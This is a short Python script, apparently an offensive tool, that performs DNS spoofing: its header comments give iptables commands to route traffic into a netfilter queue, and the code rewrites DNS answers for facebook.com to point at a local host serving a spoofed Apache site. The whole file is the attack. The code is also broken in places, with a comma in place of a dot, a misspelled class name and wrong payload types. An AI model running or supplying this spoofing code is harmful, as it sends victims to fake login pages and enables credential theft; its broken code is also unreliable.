#!/usr/bin/python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-05-2022
#Desciption: DNS spoofing python program. It will redirect to a apache spoofed site. Need apache2 service running

#commands you need to run first:
#iptables --flush
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy

def del_fields(scapy_packet):
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.UDP].len
	del scapy_packet[scapy.UDP].chksum
	return scapy_packet
	
def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet,haslayer(scapy.DNSRR):
		qname =  scapy_packet[scapy.DNSQR].qname
		if "facebook.com" in qname: #searches for url in dns queries. Doesn not work with TLS encryption
			answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.61") #change ip to your sniffing host
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			
			scapy_packet = del_fields(scapy_packet)
			
			packet.set_payload(scapy_packet)
	packet.accept()

queue = netfilterqueue.Netfilterqueue()
queue.bind(0, process_packet)
queue.run()
